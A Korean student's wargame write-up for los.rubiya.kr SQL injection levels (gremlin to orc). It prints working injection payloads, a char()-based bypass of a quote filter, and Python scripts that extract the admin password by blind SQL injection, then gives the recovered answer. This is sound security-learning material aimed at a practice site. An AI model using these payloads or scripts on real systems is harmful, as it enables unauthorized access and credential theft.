## 수업내용 떠올리기

1. url 뒤에 ?를 붙여서 query 에 내용을 넣을 수 있음(ex : ~~.php?id=admin)
2. query에서 #으로 뒷내용 주석화 시킬수있음
3. 따옴표를 사용할 수 없을때는 char(x,x,x,x)등 함수 이용
4. url encoding


***

## rubiya 사이트 난이도별 풀이

* gremlin
    * ```php
      if($result['id']) solve("gremlin");
      ```
      이 구문을 통해서 문제를 해결하는데에 pw는 상관없다는걸 알 수 있다.
      그렇기에 'id'를 TRUE로 만들어 버리면 된다. 즉 id를 요구하는 구문에
      ```
      ?id=' or 1=1%23
      ```
      를 inject해서 id자체를 TRUE로 만든 뒤 뒷부분을 #(%23) 으로 날려버리면 해결!
* cobolt
    * ```php
      if($result['id'] == 'admin') solve("cobolt");
      ```
      이 구문을 통해서 id가 admin이기만 하면 풀리는 것을 알 수 있다.
      ```
      ?id=admin'%23
      ```
      하면 풀린다. 추가로 수업에서 배운 내용으로
      ```
      ?id=' or 1=1%23
      ```
      을 inject 하면 elseif 구문으로 넘어간다.

      근데 왜 Hello {$result['id']} 에서 Hello rubiya가 나오는지는 모르겠다.
* goblin
    * ```php
      if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
      if($result['id'] == 'admin') solve("goblin");
      ```
      다옴표를 쓰지 말고 id를 admin으로 만들라고 한다.

      수업때 배운 char() 함수를 이용하면
      ```
      ?no=2 or id=char(97,100,109,105,110)
      ```
      을 삽입하여 문제를 해결한다. 
      
      여기서 no를 2로 한 이유는 잘 모르겠는데

      아마도 id=guest 이면서 no=1에 해당하는 데이터가 있어서 그 뒤 or까지 안넘어가는 것 같다. 
    
***

## orc(과제)
blind sql을 이용해서 내가 제시한 조건이 true 인지 false인지 판단한다.

이걸 이용해서 true 인 조건들을 취합하여 문제를 해결한다.
```php
if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
```
이걸 보니까 지금까지처럼 id까지 맞추고 pw부분을 주석처리해서 날려버리는 방식이 아니라 진짜로 pw를 알아내야하는 것 같다.

처음부터 끝까지 brute force를 사용하는것도 가능하겠지만 10년도 더 된 내 컴퓨터가 감당하지 못할것같기 때문에 pw의 길이부터 알아내보자.
```
?pw=jnj' or 1=1%23
```
을 해보니까 hello admin이 나온다. 1=1%23부분을 이용해서 pw의 길이를 알아내보자.
```
?pw=jnj' or length(pw)=X%23
```
노가다 해보니까 pw의 길이는 4였다.

<mark>근데 이상한 점은, pw의 길이를 8로 입력했을때도 Hello admin이 출력되었다는 것이다.</mark>

일단은 제쳐두고 pw의 길이를 4라고 가정한 후 풀어보았다.

이제 각각의 자리를 substr을 이용해서 알아내보자.

[인용](https://girrr.tistory.com/93)(https://girrr.tistory.com/93)

이 사이트는 강사님이 주신 사이트인데, 여기나온 방법대로는 파이썬에서 오류가 발생해서 

[인용](https://jaeseokim.tistory.com/26)(https://jaeseokim.tistory.com/26)

사이트를 인용하였다.

```python
import requests

url='https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php'
cookies={'PHPSESSID':'내쿠키'}
injection="' or 1=1#"
params={'id':injection}
response=requests.get(url,params=params,cookies=cookies)
print(response.text)
```

gremlin으로 테스트 해보니 성공하였다. 

길이가 4인것은 알고있으니 substr을 이용해 각 자리의 비밀번호를 알아내보기로 하자.
```python
import requests

# chr(32) 에서 chr(126) 까지만 테스트 해 보면 될 것 같다.
# chr(32) 과 chr(126) 사이에 모든 특수문자와 영어대소문자가 포함되어있기 때문이다.
url='https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php'
cookies={'PHPSESSID':'내쿠키'}
for i in range(1,5):
    for passkey in range(32,126):
        injection="jnj' or substr(pw,"+str(i)+",1)='"+chr(passkey)+"'#"
        params={'pw':injection}
        response=requests.get(url,params=params,cookies=cookies)
        if "Hello admin" in response.text:
            print(chr(passkey))
            break
```
해당 코드를 돌렸더니 비밀번호는 095A 가 나왔다.

근데 정답이 아니었다. 여기서 멘탈이 한번 나갔다. 아까 제쳐두었던 부분이 문제가된것 같았다.

이유을 찾기위해 인터넷 검색을 해보다 보니까 sql에서는 and연산자가 or 연산자보다 우선시 되어 계산된다는 것을 알게 되었다.

우리의 쿼리는
```
select id from prob_orc where id='admin' and pw='' or substr(pw,1,1)=0#'
```
이것이기 때문에 id가 무엇인가에는 관계 없이 그저 length(pw)=8의 참 거짓 여부만 참조한다.

아마 내 추측으로는, 이 데이터베이스 속에 admin이 아닌 다른 계정또한 존재하며 이것을 피해가기 위해서는 'id=admin'을 and 문과 엮어 확실히 id가 admin일때의 pw를 구해내야 한다는 것이었다.

그래서 수정된 나의 파이썬 코드는
```python
import requests

# chr(32) 에서 chr(126) 까지만 테스트 해 보면 될 것 같다.
# chr(32) 과 chr(126) 사이에 모든 특수문자와 영어대소문자가 포함되어있기 때문이다.
url='https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php'
cookies={'PHPSESSID':'내 쿠키'}
for i in range(1,9):
    for passkey in range(32,126):
        injection="jnj' or id='admin' and substr(pw,"+str(i)+",1)='"+chr(passkey)+"'#"
        params={'pw':injection}
        response=requests.get(url,params=params,cookies=cookies)
        if "Hello admin" in response.text:
            print(chr(passkey))
            break
```
이를 통해 알게된 pw는 095A9852이다.

근데 또 안됐다. ???????

대문자 소문자 문제였다. 진짜 pw는 095a9852이다.
